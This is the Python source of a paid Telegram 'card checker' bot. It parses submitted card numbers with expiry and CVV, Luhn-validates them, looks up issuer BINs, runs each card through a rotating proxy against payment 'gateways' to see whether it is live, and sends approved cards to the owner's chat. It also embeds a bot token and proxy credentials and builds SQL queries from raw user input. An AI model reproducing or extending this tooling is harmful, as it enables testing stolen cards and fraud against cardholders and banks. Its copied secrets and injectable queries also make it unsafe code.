
import logging
from os import dup
from random import random
from aiogram import Bot, Dispatcher, executor, types
import aiogram
from aiogram.utils import exceptions, executor
#from telegram import CallbackQuery
import ConnectDB
import json
import asyncio
import datetime
import re
import time
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
import pytz
import calendar
import random
import aiogram as ErrorsAiogram
import aiohttp
from Translate import Translate
from urllib.parse import urlparse
API_TOKEN = '8036683353:AAHZOCtrtCm0BpKd-CBKcWuJ4FKZvZgnER8'
logging.basicConfig(level=logging.INFO)
#log = logging.getLogger('broadcast')

bot = Bot(token=API_TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot)


async def CheckAccess(chatid, userid) :
    try :
        result =  await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{chatid}'")
        result = json.loads(json.dumps(result))
        if result : return 1
        else :
            result =  await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{userid}'")
            result = json.loads(json.dumps(result))
            if result : return 1
            else : None
    except IndexError: None

async def AccessAdmin(UserID) :
    try :
        result =  await ConnectDB.run_query(f"SELECT * FROM staffalter WHERE ID='{UserID}'")
        result = json.loads(json.dumps(result[0]))
        Permission = result['PAdmin']
        if Permission == 'Yes' : return 'Access Permitted'
    except IndexError: None

async def AccessOwner(UserID) :
    try :
        result =  await ConnectDB.run_query(f"SELECT * FROM staffalter WHERE ID='{UserID}'")
        result = json.loads(json.dumps(result[0]))
        AlterID = result['ID']
        if int(AlterID) == 5673835413 : return 'Access Permitted'
    except IndexError: None

async def CheckAccessPrivate(userid) :
    try :
        result =  await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{userid}'")
        result = json.loads(json.dumps(result))
        if result : return 1
        else : None
    except IndexError: None

async def AccessModerator(UserID) :
    try :
        result =  await ConnectDB.run_query(f"SELECT * FROM staffalter WHERE ID='{UserID}'")
        result = json.loads(json.dumps(result[0]))
        Permission = result['PModerator']
        if Permission == 'Yes' : return 'Access Permitted'
    except IndexError: None

async def Validator(cmd) :
    GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='{cmd}'")
    Gateway = json.loads(json.dumps(GatewaysSearch[0]))
    return Gateway

async def VerifyStatus(gate):
    GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM Gateways WHERE Name='{gate}'")
    Gateway = json.loads(json.dumps(GatewaysSearch[0]))
    status_g = Gateway['Status']
    fecha_g = Gateway['DateOFF']
    comment_g = Gateway['Mensaje']
    return status_g, fecha_g, comment_g

async def VerifyBanned(UserID):
    GatewaysSearch =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{UserID}'")
    Gateway = json.loads(json.dumps(GatewaysSearch[0]))
    Banned = Gateway['UserBanned']
    return Banned

async def checkLuhn(cardNo):
    nSum = 0
    isSecond = False
    for i in range(len(cardNo) - 1, -1, -1):
        d = ord(cardNo[i]) - ord('0')
        if (isSecond == True):
            d = d * 2
        nSum += d // 10
        nSum += d % 10
        isSecond = not isSecond
    if (nSum % 10 == 0): return True
    else: return False
        
async def CCheck(yourmessage) :
    try :
        matchcc = re.findall(r"\b[0-9]{15,16}\b", yourmessage)
        CCnum = matchcc[0]
        BinCheck = int(CCnum[0:1])
        if 3 <= int(BinCheck) <= 6 :
            if 15 <= len(CCnum) <= 16 :
                if 4 <= int(BinCheck) <= 6 :
                    mes = re.findall(r"\b(0[1-9]|1[0-2])\b", yourmessage)[0]
                    ano = re.findall(r"\b(3[0-1]|2[2-9]|202[2-9]|203[0-2])\b", yourmessage)[0]
                    cvv = re.findall(r"\b[0-9][0-9][0-9]\b", yourmessage)[0]

                elif int(BinCheck) == 3 :
                    mes = re.findall(r"\b(0?[1-9]|1[0-2])\b", yourmessage)[0]
                    ano = re.findall(r"\b(3[0-1]|2[2-9]|202[2-9]|203[0-2])\b", yourmessage)[0]
                    cvv = re.findall(r"\b[0-9][0-9][0-9][0-9]\b", yourmessage)[0]
        else : return None

        if await checkLuhn(CCnum) :
            IST = pytz.timezone('US/Central') 
            now = datetime.datetime.now(IST)
            if len(ano) == 2 : ano = f'20{ano}'
            if ((datetime.datetime.strptime(now.strftime("%m-%Y"), "%m-%Y") <= datetime.datetime.strptime(f'{mes}-{ano}', "%m-%Y"))) == False : return None
            
            return f"{CCnum}|{mes}|{ano}|{cvv}"
        else : None
    except IndexError: None


async def CCheckMASS(yourmessage):
    results = []
    for message in yourmessage.split("\n"):
        try:
            matchcc = re.findall(r"\b[0-9]{15,16}\b", message)
            CCnum = matchcc[0]
            BinCheck = int(CCnum[0:1])
            if 3 <= int(BinCheck) <= 6:
                if 15 <= len(CCnum) <= 16:
                    if 4 <= int(BinCheck) <= 6:
                        mes = re.findall(r"\b(0[1-9]|1[0-2])\b", message)[0]
                        ano = re.findall(r"\b(3[0-1]|2[2-9]|202[2-9]|203[0-2])\b", message)[0]
                        cvv = re.findall(r"\b[0-9][0-9][0-9]\b", message)[0]
                    elif int(BinCheck) == 3:
                        mes = re.findall(r"\b(0?[1-9]|1[0-2])\b", message)[0]
                        ano = re.findall(r"\b(3[0-1]|2[2-9]|202[2-9]|203[0-2])\b", message)[0]
                        cvv = re.findall(r"\b[0-9][0-9][0-9][0-9]\b", message)[0]
            else:
                continue

            if await checkLuhn(CCnum):
                IST = pytz.timezone('US/Central') 
                now = datetime.datetime.now(IST)
                if len(ano) == 2:
                    ano = f'20{ano}'
                if not (datetime.datetime.strptime(now.strftime("%m-%Y"), "%m-%Y") <= datetime.datetime.strptime(f'{mes}-{ano}', "%m-%Y")):
                    continue
                
                results.append(f"{CCnum}|{mes}|{ano}|{cvv}")
        except IndexError:
            continue
    return results

async def CheckProxy() :
    import aiohttp
    try:
        #randomnum = random.randint(1,75)
        Rotate = f"http://pxu29137-0:zdXn8128FgC7D5QXpm5n@x.botproxy.net:8080/"
        session = aiohttp.ClientSession()
        async with session.get("https://ipv4.webshare.io/", proxy=str(Rotate), timeout=8) as resp:
            ResultP = await resp.text()
            if (ResultP) :
                await session.close()
                return "Live ✅", Rotate
            else:
                Tries = 0
                FinalTries = 0   
                while Tries < 3:
                    if not ResultP:
                        async with session.get("https://ipv4.webshare.io/", proxy=str(Rotate), timeout=15) as resp:
                            ResultP = await resp.text()
                            if not ResultP:
                                Tries+=1
                                FinalTries+=1
                                print(f"[Require Retrie] Tries: {Tries}")
                            else :
                                Tries+=3
                                FinalTries+=0
                    else :
                        Tries+=3
                        FinalTries = 0
                if int(FinalTries) >= 3 :
                    await session.close()
                    return None
                else :
                    print(f"Tries: {FinalTries}")
                    await session.close()
                    return "Live ✅", Rotate
    except TimeoutError:
        Tries = 0
        FinalTries = 0   
        while Tries < 3:
            try:
                async with session.get("https://ipv4.webshare.io/", proxy=str(Rotate), timeout=15) as resp:
                    ResultP = await resp.text()
                    if not ResultP:
                        Tries+=1
                        FinalTries+=1
                        print(f"[Require Retrie] Tries: {Tries}")
                    else :
                        Tries+=3
                        FinalTries+=0
                if int(FinalTries) >= 3 :
                    await session.close()
                    return None
                else :
                    print(f"Tries: {FinalTries}")
                    await session.close()
                    return "Live ✅", Rotate
            except TimeoutError:
                return None
            except:
                return None
    except :
        Tries = 0
        FinalTries = 0   
        while Tries < 3:
            try:
                async with session.get("https://ipv4.webshare.io/", proxy=str(Rotate), timeout=15) as resp:
                    ResultP = await resp.text()
                    if not ResultP:
                        Tries+=1
                        FinalTries+=1
                        print(f"[Require Retrie] Tries: {Tries}")
                    else :
                        Tries+=3
                        FinalTries+=0
                if int(FinalTries) >= 3 :
                    await session.close()
                    return None
                else :
                    print(f"Tries: {FinalTries}")
                    await session.close()
                    return "Live ✅", Rotate
            except TimeoutError:
                return None
            except:
                return None

async def CheckPRM(ChatType, FromUserID, FromChatID) :
    if str(ChatType) == 'private':
        CheckPremium = await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{FromUserID}'")
        if len(CheckPremium) != 0 :
            IST = pytz.timezone('US/Central') 
            fecha_actual = datetime.datetime.now(IST).strftime(f"%d-%m-%Y %H:%M:%S")
            NextBilling =  json.loads(json.dumps(CheckPremium[0]))['NextBilling']
            if (datetime.datetime.strptime(fecha_actual, "%d-%m-%Y %H:%M:%S") > datetime.datetime.strptime(NextBilling, "%d-%m-%Y %H:%M:%S")) :
                await ConnectDB.run_query(f"UPDATE pruebas SET Status='Free User' , TimeAntiSpam='90' WHERE ID='{FromUserID}'")
                await ConnectDB.run_query(f"DELETE FROM userpremium WHERE ID='{FromChatID}'")
                await bot.ban_chat_member(chat_id=-1001857380843, user_id=FromUserID)
                await bot.unban_chat_member(chat_id=-1001857380843, user_id=FromUserID)
    else :
        CheckPremium = await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{FromChatID}'")
        if len(CheckPremium) != 0 :
            IST = pytz.timezone('US/Central') 
            fecha_actual = datetime.datetime.now(IST).strftime(f"%d-%m-%Y %H:%M:%S")
            NextBilling =  json.loads(json.dumps(CheckPremium[0]))['NextBilling']
            if (datetime.datetime.strptime(fecha_actual, "%d-%m-%Y %H:%M:%S") > datetime.datetime.strptime(NextBilling, "%d-%m-%Y %H:%M:%S")) : await ConnectDB.run_query(f"DELETE FROM userpremium WHERE ID='{FromChatID}'")
        
        CheckPremiumTwo = await ConnectDB.run_query(f"SELECT * FROM userpremium WHERE ID='{FromUserID}'")
        if len(CheckPremiumTwo) != 0:
            IST = pytz.timezone('US/Central') 
            fecha_actual = datetime.datetime.now(IST).strftime(f"%d-%m-%Y %H:%M:%S")
            NextBilling =  json.loads(json.dumps(CheckPremiumTwo[0]))['NextBilling']

            if (datetime.datetime.strptime(fecha_actual, "%d-%m-%Y %H:%M:%S") > datetime.datetime.strptime(NextBilling, "%d-%m-%Y %H:%M:%S")) :
                await ConnectDB.run_query(f"UPDATE pruebas SET Status='Free User' , TimeAntiSpam='90' WHERE ID='{FromUserID}'")
                await ConnectDB.run_query(f"DELETE FROM userpremium WHERE ID='{FromUserID}'")
                await bot.ban_chat_member(chat_id=-1001857380843, user_id=FromUserID)
                await bot.unban_chat_member(chat_id=-1001857380843, user_id=FromUserID)

@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["sb"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Syna [ 15$ ]'
    TwoNameGateway = 'Gateway ↯ Syna [ 15$ ]'
    ThreeGateway = 'Gateway 🔥 Syna [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('sb')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    CcVerify = await CCheck(re.sub("[^0-9]", " ", VerMessage))
    if not CcVerify:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nIncorrect ↯ Invalid Info! ⚠️\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.sender_chat:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are forbidden from this bot. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if message.forward_from:
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nThe use of forwarded messages is prohibited. ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return 
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        result = await ConnectDB.run_query(f"SELECT * FROM bins WHERE bin='{CcVerify[0:6]}'")
        result = json.loads(json.dumps(result[0]))
        type = result['type']
        level = result['level']
        brand = result['brand']
        bank = result['bank']
        country = result['country']
        emoji = result['Emoji']
    except IndexError :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nBin Not Found!\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if ((brand == 'VISA') or (brand == 'MASTERCARD') or (brand == 'DISCOVER') or (brand == 'AMERICAN EXPRESS')) == False :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{brand} {emoji}</code>\nComment ↯ <code>This bot only accepts American, Visa, Mastercard and Discover.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    rbin = await ConnectDB.run_query(f"SELECT * FROM binbanned WHERE Bin='{CcVerify[0:6]}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (len(rbin) != 0) or (int(level.find('PREPAID')) >= 0) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ Bin banned for this bot. ↯\n- - - - - - - - - - - - - - - - - - - - -\nCC ↯ <code>{CcVerify}</code>\nInfo ↯ <code>{level} {emoji}</code>\nComment ↯ <code>All Prepaid Banned.</code>\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError : print("Unexpected error, not Registered User!")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    UltimoCheck = result['UltimoCheck']
    TimeAntiSpam = result['TimeAntiSpam']
    hora_actual = calendar.timegm(datetime.datetime.utcnow().utctimetuple())

    ad = int(hora_actual) - int(UltimoCheck)
    tiempofaltante = int(TimeAntiSpam) - int(ad)

    if int(ad) < int(TimeAntiSpam):
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ ANTISPAM ⚠️ ] ↯\n- - - - - - - - - - - - - - - - - - - - -\nTest again in {tiempofaltante} seconds !\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    else : await ConnectDB.run_query(f"UPDATE pruebas SET ID='{message.from_user.id}' , UltimoCheck={hora_actual} WHERE ID='{message.from_user.id}'")
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    try :
        fin = f'{time.time()-inicio}'
        message_send = await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n↯ [ CHECKING CARD 🔴 ] ↯\n- - - - - - - - - - - - - - - - - - - - -\n{TwoNameGateway}\nCC ↯ <code>{CcVerify}</code>\nTime ↯ {fin[0:4]}s\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
    except TimeoutError or exceptions.RetryAfter as e: await asyncio.sleep(e.value)
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    await CheckPRM(message.chat.type, message.from_user.id, message.chat.id)
    result =  await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
    UserStatus = json.loads(json.dumps(result[0]))['Status']

    if not message.from_user.username : UserName = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    else : UserName = f'@{message.from_user.username}'
    if CcVerify:
        CheckedP = await CheckProxy()
        try :
            if not CheckedP :
                await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>[ An unexpected error occurred. Proxy Error. ⚠️ ]</b>\nResult - ↯ <b>Please try again.\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
                return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        from CMDsb import CMDsbCHK
        CheckRecive = await CMDsbCHK(CcVerify, CheckedP[1])

        if (CheckRecive[0] == 'Approved') :
            CheckRecive = CheckRecive[1]
            Status = '[ APPROVED ✅ ]'
            await bot.send_message(chat_id=5673835413, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
        elif int(CheckRecive.find('An unexpected error occurred')) >= 0 :
            Status = f'[ {CheckRecive} ]'
            CheckRecive = f'Please try again.'
        else :
            Status = '[ DECLINED ❌ ]'

        fin = f'{time.time()-inicio}'
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#
        try :
            await bot.edit_message_text(chat_id=message.chat.id, message_id=message_send.message_id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{ThreeGateway}\n- - - - - - - - - - - - - - - - - - - - -\n</b>CC - ↯ <code>{CcVerify}</code>\nStatus - ↯ <b>{Status}</b>\nResult - ↯ <b>{CheckRecive}\n- - - - - - - - - - - - - - - - - - - - -\n</b>Bin - ↯ <b>{brand} | {type} | {level}</b>\nBank - ↯ <b>{bank}</b>\nCountry - ↯ <b>{country} [{emoji}]</b>\n- - - - - - - - - - - - - - - - - - - - -\nProxy - ↯ [ <b>{CheckedP[0]}</b> ]\nTest Time - ↯ <b>{fin[0:4]}s</b>\nChecked by - ↯ <b>{UserName} [{UserStatus}]</b>")
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
        #--------------------------------- ALTER CHECKER ---------------------------------#
        #--------------------------------- ALTER CHECKER ---------------------------------#


@dp.message_handler(commands_prefix=["!", ".", "$", "/", ",","-","#"], commands=["rr"])
async def CMDsb(message: types.Message):
    NameGateway = 'Gateway 🔥 Ryuk [ 12$ ]'
    TwoNameGateway = 'Gateway ↯ Ryuk [ 12$ ]'
    ThreeGateway = 'Gateway 🔥 Ryuk [↯]'
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    WaitStatus = await VerifyStatus('rr')
    if (WaitStatus[0] == 'OFFLINE ❌') or (WaitStatus[0] == 'OFFLINE1 ❌') :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nSTATUS [ {WaitStatus[0]} ]\nFormat: <code>cc|mon|year|cvv</code>\nComment: </b>{WaitStatus[2]}\n<b>Update Since: </b>{WaitStatus[1]}\n<b>- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    try:
        result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
        result = json.loads(json.dumps(result[0]))
    except IndexError :
            UserSince = datetime.datetime.now().strftime("%d-%m-%Y")
            await ConnectDB.run_query(f"INSERT INTO pruebas (ID, UserSince) VALUES ('{message.from_user.id}', '{UserSince}')")
            
            result = await ConnectDB.run_query(f"SELECT * FROM pruebas WHERE ID='{message.from_user.id}'")
            result = json.loads(json.dumps(result[0]))
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    if (await VerifyBanned(f'{message.from_user.id}')) == 'Yes' :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\nYou are banned from this bot.\n- - - - - - - - - - - - - - - - - - - - -</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    if int(len(re.sub("[^0-9]", "", message.text)))>=15:
        VerMessage = message.text
    elif message.reply_to_message:
            VerMessage = message.reply_to_message.text
    else :
        VerMessage = message.text

    if not re.sub("[^0-9]", "", VerMessage) :
        try :
            await bot.send_message(chat_id=message.chat.id, text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{NameGateway}\n- - - - - - - - - - - - - - - - - - - - -\nFormat: <code>cc|mon|year|cvv</code>\n- - - - - - - - - - - - - - - - - - - - -\n</b>", reply_to_message_id=message.message_id)
            return
        except TimeoutError or exceptions.RetryAfter as e:
            await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.MessageToEditNotFound:
            #await asyncio.sleep(e.value)
            return
        except aiogram.utils.exceptions.BadRequest:
            #await asyncio.sleep(e.value)
            return
    #--------------------------------- ALTER CHECKER ---------------------------------#
    #--------------------------------- ALTER CHECKER ---------------------------------#
    inicio = time.time()
    try :
        await bot.send_chat_action(chat_id=message.chat.id, action='typing')
    except TimeoutError or exceptions.RetryAfter as e:
        await asyncio.sleep(e.value)
    if not await CheckAccess(message.chat.id, message.from_user.id) :
        from Translate import Translate
        try :
            try :
                language = message.from_user.language_code
                lenguage_code = language[0:2].lower()
            except TypeError:
                translate = 'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.'
            else :
                translate = await Translate(lenguage_code,'Hello! Sorry, this chat does not have access to use me!\n- - - - - - - - - - - - - - - - - - - - -\nBuy a membership.')

            one = InlineKeyboardButton('𝐀𝐥𝐭𝐞𝐫𝐂𝐇𝐊 𝐂𝐡𝐚𝐧𝐧𝐞𝐥', url='https://t.me/alterchk')
            repmarkup = InlineKeyboardMarkup(row_width=1).add(one)
            await bot.send_message(
                chat_id=message.chat.id, 
                text=f"<b>- - - - - - - - - - - - - - - - - - - - -\n{translate} ⚠️\n- - - - - - - - - - - - - - - - - - - - -</b>",
                reply_to_message_id=message.message_id,
                reply_markup=repmarkup
            )
            return
